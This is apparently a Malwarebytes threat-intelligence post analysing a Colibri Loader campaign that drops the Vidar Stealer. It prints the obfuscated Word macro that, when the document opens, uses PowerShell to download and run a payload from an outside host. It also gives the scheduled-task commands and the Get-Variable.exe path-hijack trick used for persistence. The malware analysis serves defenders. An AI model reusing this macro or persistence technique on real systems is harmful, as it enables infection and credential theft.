<div>
<p><img alt="Colibri Loader combines Task Scheduler and PowerShell in clever persistence technique" src="https://blog.malwarebytes.com/wp-content/uploads/2015/01/photodune-1571906-paint-s-900x506.jpg" style="max-width:80%;height:auto;width:auto;"/></p>
<p><a href="https://blog.malwarebytes.com/category/threat-intelligence/" rel="category tag">Threat Intelligence</a></p>
<h1 class="entry-title p-name">
					Colibri Loader combines Task Scheduler and PowerShell in clever persistence technique				</h1>
<p>Posted: April 5, 2022 by <a href="https://blog.malwarebytes.com/author/threatintelligence/" rel="author" title="Posts by Threat Intelligence Team">Threat Intelligence Team</a>
</p>
We discovered an interesting trick used by Colibri Loader to survive reboots that takes advantage of a legitimate command in PowerShell.
<p>This blog post was authored by Ankur Saini, with contributions from Hossein Jazi and Jérôme Segura</p>
<p>Colibri Loader is a relatively new piece of malware that first appeared on underground forums in August 2021 and was advertised to “people who have large volumes of traffic and lack of time to work out the material“. As it names suggests, it is meant to deliver and manage payloads onto infected computers.</p>
<p>Our Threat Intelligence Team recently uncovered a new Colibri Loader campaign delivering the Vidar Stealer as final payload. There is already published material about Colibri by <a href="https://cloudsek.com/in-depth-technical-analysis-of-colibri-loader-malware/" rel="noreferrer noopener" target="_blank">CloudSek</a> and <a href="https://fr3d.hk/blog/colibri-loader-back-to-basics" rel="noreferrer noopener" target="_blank">independent researchers</a>. Since most of the details about the bot have been covered, we decided to highlight a persistence technique we haven’t seen before.</p>
<h3>Campaign attack chain</h3>
<p>The attack starts with a malicious Word document deploying Colibri bot that then delivers the Vidar Stealer. The document contacts a remote server at (securetunnel[.]co) to load a remote template named trkal0.dot that contacts a malicious macro. This attack is known as remote template injection.</p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/04/Screenshot-2022-03-25-at-2.43.40-AM.png" title=""><img alt="" class="wp-image-55524" height="954" src="https://blog.malwarebytes.com/wp-content/uploads/2022/04/Screenshot-2022-03-25-at-2.43.40-AM.png" style="max-width:800px;height:auto;width:auto;" width="1394"/></a></figure>
<p>The macro enables PowerShell to download the final payload (Colibri Loader) as setup.exe:</p>
<p><code>Private Sub Document_Open()</code>
<code>zgotwed = "C:\Users\Public\setup.ex`e"</code>
<code>n87lcy4 = Replace("new:72Cs19e4ts4D", "s19e4ts", "2")</code>
<code>Set hu9v0dd = GetObject(n87lcy4 &amp; "D5-D70A-438B-8A42-984" &amp; CLng("1.8") &amp; "4B88AFB" &amp; CInt("8.1"))</code>
<code>hu9v0dd.exec "cm" &amp; "d /c powers^hell -w hi Start-BitsTransfer -Sou htt`ps://securetunnel .co/connection/setup.e`xe -Dest " &amp; zgotwed &amp; ";" &amp; zgotwed</code>
<code>End Sub</code></p>
<h3>Abusing PowerShell for Persistence</h3>
<p>Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\Local\Microsoft\WindowsApps and names it Get-Variable.exe for Windows 10 and above, while for lower versions it drops it in %DOCUMENTS%/WindowsPowerShell named as dllhost.exe</p>
<p>On Windows 7, it creates a scheduled task using the following command:</p>
<ul><li>schtasks.exe /create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f /tr “C:\Users\admin\Documents\WindowsPowerShell\dllhost.exe“</li></ul>
<p>On Windows 10 and above, it creates a scheduled task using the following command:</p>
<ul><li>schtasks.exe /create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f /tr “powershell.exe -windowstyle hidden“</li></ul>
<p>In the first scenario (Win7), we see a task pointing to the path of Colibri Loader. However, in the second we see an odd task to execute PowerShell with a hidden window. This is what we believe is a new persistence technique employed by the malware author.</p>
<p>As mentioned earlier, it drops the file with the name Get-Variable.exe in the WindowsApps directory. It so happens that <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-variable?view=powershell-7.2" rel="noreferrer noopener" target="_blank">Get-Variable</a> is a valid PowerShell <a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.2" rel="noreferrer noopener" target="_blank">cmdlet</a> (a cmdlet is a lightweight command used in the Windows PowerShell environment) which is used to retrieve the value of a variable in the current console.</p>
<p>Additionally, WindowsApps is by default in the path where PowerShell is executed. So when the Get-Variable command is issued on PowerShell execution, the system first looks for the Get-Variable executable in the path and executes the malicious binary instead of looking for the PowerShell cmdlet.</p>
<p>We reproduced this technique using the calculator to show how an adversary can easily achieve persistence combining a scheduled task and any payload (as long as it is called Get-Variable.exe and placed in the proper location):</p>
<figure class="wp-block-image size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/04/colibri_persistence.gif" title=""><img alt="" class="wp-image-55521" height="578" src="https://blog.malwarebytes.com/wp-content/uploads/2022/04/colibri_persistence.gif" style="max-width:800px;height:auto;width:auto;" width="726"/></a></figure>
<p>A search on VirusTotal for the file name Get-Variable.exe indicates that the <a href="https://www.virustotal.com/gui/file/6b74dc043f9a12823ed98d704e4c8543c9b5d8b9240e65e9d31d2303ab914906" rel="noreferrer noopener" target="_blank">first malicious file</a> uploaded to the platform happened last August, which matches with the time that Colibri appeared on XSS underground forums. That sample has the same networking features as Colibri which helps us ascertain with more confidence that the technique was debuted by Colibri.</p>
<h3>Conclusion</h3>
<p>Colibri is still in its infancy but it already offers many features for attackers and slowly seems to be gaining popularity. The persistence technique we outlined in this blog is simple but efficient and does not appear to be known.</p>
<p>Malwarebytes users are protected against this attack thanks to our Anti-Exploit layer:</p>
<figure class="wp-block-image size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/04/block.png" title=""><img alt="" class="wp-image-55523" height="676" src="https://blog.malwarebytes.com/wp-content/uploads/2022/04/block.png" style="max-width:800px;height:auto;width:auto;" width="842"/></a></figure>
<h3>IOCs</h3>
<p>Word Document</p>
<p>666268641a7db3b600a143fff00a063e77066ad72ac659ebc77bb5d1acd5633d</p>
<p>setup.exe (Colibri)</p>
<p>54a790354dbe3ab90f7d8570d6fc7eb80c024af69d1db6d0f825c094293c5d77</p>
<p>install.exe (Vidar)</p>
<p>b92f4b4684951ff2e5abdb1280e6bff80a14b83f25e4f3de39985f188d0f3aad</p>
<p>SHARE THIS ARTICLE</p>
<a class="socicon-facebook" href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.malwarebytes.com%2F%3Fp%3D54959&amp;t=Colibri+Loader+combines+Task+Scheduler+and+PowerShell+in+clever+persistence+technique" id="social-share-facebook" target="_blank"></a>
<a class="socicon-twitter" href="https://twitter.com/intent/tweet?text=Colibri+Loader+combines+Task+Scheduler+and+PowerShell+in+clever+persistence+technique+https%3A%2F%2Fblog.malwarebytes.com%2F%3Fp%3D54959&amp;via=Malwarebytes" id="social-share-twitter" target="_blank"></a>
<a class="socicon-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fblog.malwarebytes.com%2F%3Fp%3D54959&amp;title=Colibri+Loader+combines+Task+Scheduler+and+PowerShell+in+clever+persistence+technique&amp;summary=&amp;source=" id="social-share-linkedin" target="_blank"></a>
<p>ABOUT THE AUTHOR</p>
<img alt="" class="avatar avatar-96 photo grav-hashed grav-hijack" height="96" id="grav-147cd7280d6ece931e4488a3a10809d9-0" src="https://secure.gravatar.com/avatar/147cd7280d6ece931e4488a3a10809d9?s=96&amp;d=identicon&amp;r=g" width="96"/>
<p>
<a href="https://blog.malwarebytes.com/author/threatintelligence/" rel="author" title="Posts by Threat Intelligence Team">Threat Intelligence Team</a>
</p>
<p></p>
</div>